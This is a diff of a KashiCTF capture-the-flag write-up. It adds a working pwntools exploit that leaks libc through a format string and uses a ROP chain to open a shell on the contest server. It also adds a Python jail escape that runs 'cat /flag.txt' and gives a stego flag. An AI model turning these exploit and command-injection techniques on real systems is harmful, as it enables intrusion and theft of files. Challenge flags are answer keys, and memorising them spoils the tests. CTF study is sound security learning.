@@ -93,3 +93,24 @@ Using SilentEye,  I analyzed the image and extracted hidden data. The decoded me
 
 
 `KashiCTF{K33p_1t_re4l}`
+
+# The Troll Zone
+
+```py
+from pwn import *
+context.arch="amd64"
+p=remote("kashictf.iitbhucybersec.in",65239)
+libc=ELF("libc.so.6")
+p.sendlineafter("? ","%17$p")
+p.recvuntil("Lmao not giving you ")
+libc.address=int(p.recvline(keepends=False),16) -0x2724a
+print(f"{hex(libc.address)=}")
+p.sendlineafter("at? ",b'a'*0x28+p64(0x0040123f)+p64(next(libc.search(asm('pop rdi; ret'), executable=True)))+p64(libc.search(b'/bin/sh').__next__())+p64(libc.sym['system']))
+p.interactive()
+```
+# By `superman_.22`
+
+- easy jail 1
+    - `__import__('os').system('cat /flag.txt')`
+- `MemorieBringBackYou` and `Corruption`
+    - Just grep
